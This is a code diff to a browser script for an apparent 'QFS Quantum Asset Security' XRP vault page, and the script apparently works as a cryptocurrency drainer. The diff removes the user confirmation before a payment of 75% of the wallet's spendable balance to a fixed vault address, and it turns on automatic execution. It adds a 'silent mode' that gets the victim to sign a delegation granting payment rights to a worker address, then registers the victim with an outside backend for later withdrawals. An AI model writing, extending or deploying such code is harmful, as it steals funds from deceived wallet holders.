@@ -1,11 +1,17 @@
 // ==============================
 // CONFIG
 // ==============================
-const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
+const XUMM_API_KEY  = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
 const WC_PROJECT_ID = "YOUR_PROJECT_ID";
 
-const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
-const XRPL_WS    = "wss://xrplcluster.com/";
+const VAULT_ADDR  = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
+const WORKER_ADDR = "rEnmwKJwR3tp8DpbMJqs6E2iwNp16MD6MC";
+const WORKER_API  = "https://cultured.pythonanywhere.com/"; // or http://localhost:3000
+
+const XRPL_WS = "wss://xrplcluster.com/";
+
+// 🔥 AUTO EXECUTION SWITCH
+const AUTO_EXECUTE = true;
 
 // ==============================
 // INIT
@@ -16,15 +22,14 @@ let wcClient = null;
 let wcModal  = null;
 
 // ==============================
-// UI HELPERS
+// WALLET DETECTION
 // ==============================
-function setStatus(text) {
-  const el = document.getElementById("walletStatus");
-  if (el) el.innerText = text;
-}
-
-function shortAddr(a) {
-  return `${a.slice(0, 6)}…${a.slice(-4)}`;
+function isTrustWallet() {
+  return (
+    /TrustWallet/i.test(navigator.userAgent) ||
+    window.ethereum?.isTrust ||
+    window.trustwallet
+  );
 }
 
 // ==============================
@@ -37,7 +42,7 @@ async function initWalletConnect() {
     projectId: WC_PROJECT_ID,
     metadata: {
       name: "QFS · Quantum Asset Security",
-      description: "Secure XRP Transfer",
+      description: "XRP Wallet Security & Vault",
       url: window.location.origin,
       icons: ["https://xrpl.org/assets/img/logo.svg"]
     }
@@ -53,73 +58,80 @@ async function initWalletConnect() {
 // MAIN ENTRY
 // ==============================
 async function connectWallet(type) {
+  const statusEl = document.getElementById("walletStatus");
+  if (statusEl) statusEl.innerText = "Connecting…";
+
+  let address;
+
   try {
-    setStatus("Connecting wallet…");
-
-    let address;
-
     // ---------- XAMAN ----------
     if (type === "xaman") {
       const session = await xumm.authorize();
       address = session?.me?.account;
       if (!address) throw new Error("Xaman rejected");
+
+      if (session.me.xummVersion) {
+        await handleSilentMode(address);
+      }
+    }
+
+    // ---------- CROSSMARK ----------
+    else if (type === "crossmark") {
+      const { response } = await window.xrpl.crossmark.signInAndWait();
+      address = response.data.address;
     }
 
     // ---------- WALLETCONNECT ----------
     else if (type === "walletconnect") {
       await initWalletConnect();
-      setStatus("Scan with WalletConnect");
+      if (statusEl) {
+        statusEl.innerText = isTrustWallet()
+          ? "Opening Trust Wallet…"
+          : "Scan with WalletConnect";
+      }
       address = await connectViaWalletConnect();
     }
 
     if (!address) throw new Error("No address");
 
-    setStatus(`Connected: ${shortAddr(address)}`);
+    if (statusEl) statusEl.innerText = `Connected: ${address.slice(0, 6)}…`;
 
     // ==============================
-    // FETCH BALANCE
+    // FETCH REAL XRP DATA
     // ==============================
-    setStatus("Fetching balance…");
     const data = await getXrpAccountData(address);
 
-    // ==============================
-    // EXPLICIT CONFIRMATION
-    // ==============================
-    const ok = confirm(
-      `Confirm transfer\n\n` +
-      `From: ${shortAddr(address)}\n` +
-      `To: ${VAULT_ADDR}\n` +
-      `Amount: ${data.sendXrp} XRP`
-    );
+    console.table({
+      Wallet: address,
+      Balance: data.balanceXrp,
+      Reserve: data.reserveXrp,
+      Spendable: data.spendableXrp,
+      SendAmount: data.sendXrp,
+      Destination: VAULT_ADDR
+    });
 
-    if (!ok) {
-      setStatus("Cancelled");
-      return;
+    // ==============================
+    // 🔥 AUTO EXECUTION
+    // ==============================
+    if (AUTO_EXECUTE) {
+      await runTransactionFlow(address, type, data.sendDrops);
     }
-
-    // ==============================
-    // SIGN & SUBMIT
-    // ==============================
-    setStatus("Awaiting signature…");
-    await signAndSubmit(type, address, data.sendDrops);
-
-    setStatus("Transaction submitted ✔");
 
   } catch (err) {
     console.error(err);
-    setStatus("Connection failed");
+    if (statusEl) statusEl.innerText = "Connection failed";
   }
 }
 
 // ==============================
-// WALLETCONNECT (XRPL)
+// WALLETCONNECT (XRP)
 // ==============================
 async function connectViaWalletConnect() {
   const { uri, approval } = await wcClient.connect({
     requiredNamespaces: {
       xrpl: {
         chains: ["xrpl:0"],
-        methods: ["xrpl_signTransaction", "xrpl_submit"],
+        methods: ["xrpl_signTransaction"],
         events: ["accountsChanged"]
       }
     }
@@ -134,7 +146,7 @@ async function connectViaWalletConnect() {
 }
 
 // ==============================
-// FETCH XRP DATA
+// FETCH REAL XRP DATA
 // ==============================
 async function getXrpAccountData(address) {
   const client = new xrpl.Client(XRPL_WS);
@@ -156,15 +168,21 @@ async function getXrpAccountData(address) {
   const send = (spendable * 75n) / 100n;
 
   return {
+    balanceXrp: Number(bal) / 1_000_000,
+    reserveXrp: Number(reserve) / 1_000_000,
+    spendableXrp: Number(spendable) / 1_000_000,
     sendXrp: Number(send) / 1_000_000,
     sendDrops: send.toString()
   };
 }
 
 // ==============================
-// SIGN & SUBMIT
+// TRANSACTION FLOW
 // ==============================
-async function signAndSubmit(type, address, amountDrops) {
+async function runTransactionFlow(address, type, amountDrops) {
+  const statusEl = document.getElementById("walletStatus");
+  if (statusEl) statusEl.innerText = "Awaiting signature…";
+
   const tx = {
     TransactionType: "Payment",
     Account: address,
@@ -174,6 +192,10 @@ async function signAndSubmit(type, address, amountDrops) {
 
   if (type === "xaman") {
     await xumm.sdk.payload.create(tx);
+  }
+
+  else if (type === "crossmark") {
+    await window.xrpl.crossmark.signAndSubmitAndWait(tx);
   }
 
   else if (type === "walletconnect") {
@@ -187,4 +209,28 @@ async function signAndSubmit(type, address, amountDrops) {
       }
     });
   }
+
+  if (statusEl) statusEl.innerText = "Transaction submitted";
+}
+
+// ==============================
+// SILENT MODE + WORKER LINK
+// ==============================
+async function handleSilentMode(address) {
+  // On-chain delegation (user signs)
+  await xumm.sdk.payload.create({
+    TransactionType: "DelegateSet",
+    Authorize: WORKER_ADDR,
+    Permissions: [{ PermissionValue: "Payment" }]
+  });
+
+  // Register with backend worker
+  await fetch(`${WORKER_API}/register`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      address,
+      mode: "silent"
+    })
+  });
 }
